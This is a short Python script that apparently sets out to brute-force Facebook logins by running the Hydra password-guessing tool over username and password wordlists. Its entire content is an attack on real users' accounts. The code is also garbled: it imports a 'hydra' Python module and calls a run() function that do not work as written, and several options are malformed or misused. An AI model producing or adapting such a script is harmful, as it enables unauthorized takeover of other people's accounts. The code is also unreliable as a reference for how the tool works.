import os
import sys
import time

import hydra

def main():
    # Facebook login URL
    login_url = "https://www.facebook.com/login.php"

    # Username and password files
    username_file = "usernames.txt"
    password_file = "passwords.txt"

    # Hydra options
    hydra_options = [
        "-l",
        "-f",
        "-V",
        "-t",
        4,
        "-W",
        5,
        "-P",
        password_file,
        "-s",
        login_url,
        "login",
        "username",
        "password",
        "-U",
        username_file,
        "-e",
        "hmac-md5",
        "-F",
    ]

    # Start Hydra
    hydra.run(*hydra_options)

if __name__ == "__main__":
    main()